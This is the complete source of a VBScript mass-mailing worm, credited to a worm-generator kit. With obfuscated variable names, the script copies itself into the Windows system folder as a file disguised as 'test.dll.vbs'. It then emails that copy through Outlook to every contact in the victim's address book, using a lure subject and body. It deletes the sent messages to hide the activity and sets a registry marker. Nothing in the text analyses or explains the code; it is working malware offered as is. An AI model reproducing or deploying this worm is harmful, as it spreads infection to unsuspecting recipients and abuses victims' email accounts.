'This file Has been created whit the Vbs Worms Creator 0.8
'Worm Created By [V]orteX
On Error Resume Next
Set allqvshpyis = CreateObject("WScript.Shell")
Set xudbnyknlrs= Createobject("scripting.filesystemobject")
xudbnyknlrs.copyfile wscript.scriptfullname,xudbnyknlrs.GetSpecialFolder(0)& "\test.dll.vbs"
if allqvshpyis.regread ("HKCU\software\Worm\mailed") <> "1" then
pkaeeegzvzo()
end if
Function pkaeeegzvzo()
On Error Resume Next
Set uucefbovskb = CreateObject("Outlook.Application")
If uucefbovskb= "Outlook"Then
Set cmadjpzgztg=uucefbovskb.GetNameSpace("MAPI")
For Each rrfwexzmzfc In cmadjpzgztg.AddressLists
If rrfwexzmzfc.AddressEntries.Count <> 0 Then
For lkvgsomsbit= 1 To rrfwexzmzfc.AddressEntries.Count
Set nrdbpqhrtxs = rrfwexzmzfc.AddressEntries(lkvgsomsbit)
Set imnmoadhwdc = uucefbovskb.CreateItem(0)
imnmoadhwdc.To = nrdbpqhrtxs.Address
imnmoadhwdc.Subject = "Here you have, ;o)"
imnmoadhwdc.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
imnmoadhwdc.Attachments.Add xudbnyknlrs.GetSpecialFolder(0)& "\test.dll.vbs"
imnmoadhwdc.DeleteAfterSubmit = True
If imnmoadhwdc.To <> "" Then
imnmoadhwdc.Send
allqvshpyis.regwrite "HKCU\software\Worm\mailed", "1"
End If
Next
End If
Next
end if
End Function
